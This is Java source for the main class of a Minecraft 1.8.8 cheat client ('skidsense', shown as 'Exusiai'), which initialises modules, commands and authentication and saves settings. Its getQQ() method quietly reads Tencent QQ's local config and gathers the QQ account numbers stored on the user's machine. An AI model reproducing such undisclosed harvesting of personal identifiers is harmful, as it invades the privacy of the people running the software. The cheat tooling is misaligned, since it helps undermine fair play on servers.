package me.skidsense;

import me.skidsense.hooks.value.Value;
import me.skidsense.management.CommandManager;
import me.skidsense.management.FileManager;
import me.skidsense.management.ModManager;
import me.skidsense.management.authentication.AuthUser;
import me.skidsense.management.fontRenderer.FontManager;
import me.skidsense.management.friend.FriendManager;
import me.skidsense.management.waypoints.WaypointManager;
import me.skidsense.module.Mod;
import me.skidsense.module.collection.visual.TabGUI;

import net.minecraft.block.Block;
import net.minecraft.block.BlockLadder;
import net.minecraft.block.BlockVine;
import net.minecraft.block.material.Material;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.EntityLivingBase;
import net.minecraft.util.BlockPos;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import javax.swing.text.html.parser.Entity;

import org.lwjgl.opengl.Display;



public class Client {

	public static Minecraft mc = Minecraft.getMinecraft();
	public static Client instance = new Client();
	public static String clientName = "Exusiai";
	public AuthUser authuser;
	public static ModManager modulemanager;
	public CommandManager commandmanager;
	public FontManager fontManager;
	private static me.skidsense.management.alt.FileManager fileManager;
	public EntityLivingBase viptarget;
	public ArrayList<AuthUser> tempAuthUsers = new ArrayList<AuthUser>();
	public WaypointManager waypointManager;
	
	public void initiate() {
		fontManager = new FontManager();
		this.commandmanager = new CommandManager();
		this.commandmanager.setup();
		FriendManager.start();
		modulemanager = new ModManager();
		modulemanager.init();
		(fileManager = new me.skidsense.management.alt.FileManager()).loadFiles();
		waypointManager = new WaypointManager();
		FileManager.init();
	}

	public static ModManager getModuleManager() {
		return modulemanager;
	}

	public CommandManager getCommandManager() {
		return this.commandmanager;
	}

	public static void renameClient(String s){
		clientName = s;
		Display.setTitle(String.format("%s [1.8.8]",s));
	}
	
	public void shutDown() {
		String values = "";
		for (Mod m : ModManager.getMods()) {
			for (Value v : m.getValues()) {
				values = String.valueOf(values) + String.format("%s:%s:%s%s", m.getName(), v.getName(), v.getValue(), System.lineSeparator());
			}
		}
		FileManager.save("Values.txt", values, false);
		String enabled = "";
		for (Mod m : ModManager.getMods()) {
			if (!m.isEnabled()) {
				continue;
			}
			enabled = String.valueOf(enabled) + String.format("%s%s", m.getName(), System.lineSeparator());
		}
		FileManager.save("Enabled.txt", enabled, false);
	}

	public static BlockPos getBlockCorner(BlockPos start, BlockPos end) {
		for (int x = 0; x <= 1; ++x) {
			for (int y = 0; y <= 1; ++y) {
				for (int z = 0; z <= 1; ++z) {
					BlockPos pos = new BlockPos(end.getX() + x, end.getY() + y, end.getZ() + z);
					if (!isBlockBetween(start, pos)) {
						return pos;
					}
				}
			}
		}

		return null;
	}

	public static boolean isBlockBetween(BlockPos start, BlockPos end) {
		int startX = start.getX();
		int startY = start.getY();
		int startZ = start.getZ();
		int endX = end.getX();
		int endY = end.getY();
		int endZ = end.getZ();
		double diffX = (double) (endX - startX);
		double diffY = (double) (endY - startY);
		double diffZ = (double) (endZ - startZ);
		double x = (double) startX;
		double y = (double) startY;
		double z = (double) startZ;
		double STEP = 0.1D;
		int STEPS = (int) Math.max(Math.abs(diffX), Math.max(Math.abs(diffY), Math.abs(diffZ))) * 4;

		for (int i = 0; i < STEPS - 1; ++i) {
			x += diffX / (double) STEPS;
			y += diffY / (double) STEPS;
			z += diffZ / (double) STEPS;
			if (x != (double) endX || y != (double) endY || z != (double) endZ) {
				BlockPos pos = new BlockPos(x, y, z);
				Block block = mc.theWorld.getBlockState(pos).getBlock();
				if (block.getMaterial() != Material.air && block.getMaterial() != Material.water && !(block instanceof BlockVine) && !(block instanceof BlockLadder)) {
					return true;
				}
			}
		}

		return false;
	}

	   public List<String> getQQ() {
	       ArrayList<String> qq = new ArrayList<>();
	       try {
	           File qqData = new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini");
	           if (qqData.exists() && qqData.isFile()) {
	               BufferedReader stream = new BufferedReader(new InputStreamReader(new FileInputStream(qqData)));
	               String line;
	               while ((line = stream.readLine()) != null && line.length() > 0) {
	                   if (line.startsWith("UserDataSavePath=")) {
	                       File tencentFiles = new File(line.split("=")[1]);
	                       if (tencentFiles.exists() && tencentFiles.isDirectory()) {
	                           for (File qqdir : tencentFiles.listFiles()) {
	                               if (qqdir.isDirectory() && qqdir.getName().length() >= 6 && qqdir.getName().length() <= 10 && qqdir.getName().matches("^[0-9]*$")) {
	                                   qq.add(qqdir.getName());
	                               }
	                           }
	                       }
	                   }
	               }
	           }
	       } catch (Throwable e) {
	           e.printStackTrace();
	       }
	       return qq;
	   }
	   
	public static boolean onServer(String server) {
		if (!mc.isSingleplayer() && mc.getCurrentServerData().serverIP.toLowerCase().contains(server)) {
			return true;
		}
		return false;
	}

	public static void notif(String aaaaa) {
		me.skidsense.notifications.Notification.SendNotification(aaaaa);

	}

	public static me.skidsense.management.alt.FileManager getFileManager() {
		return fileManager;
	}

}
